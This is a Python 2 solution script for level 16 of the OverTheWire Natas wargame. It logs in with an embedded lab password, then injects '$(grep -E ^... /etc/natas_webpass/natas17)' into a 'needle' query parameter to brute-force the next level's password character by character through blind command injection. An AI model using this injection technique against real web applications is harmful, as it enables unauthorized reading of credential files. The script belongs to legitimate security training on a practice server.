import requests

account = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
login = account + ':' + password + '@'

protocol = 'http://'
URL = 'natas16.natas.labs.overthewire.org/'

target = protocol + login + URL

r = requests.get( target )

if r.status_code == requests.codes.ok :
	print 'OK'

allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

password = ''
"""
c = 'a'
r = requests.get( target + '?needle=$(grep -E ^' + c +'.* /etc/natas_webpass/natas17)')
content = r.content
print content.find('</pre>') - content.find('<pre>')
"""
while password.__len__() < 32 :
	for c in allChars :
		tmp = password + c
		r = requests.get( target + '?needle=$(grep -E ^' + tmp +'.* /etc/natas_webpass/natas17)')
		content = r.content
		if content.find('</pre>') - content.find('<pre>') == 6 :
			password = tmp
			print 'current password : ' + password
		 

print 'END~~~'

#$(grep -E ^b.* /etc/natas_webpass/natas17)
#"""
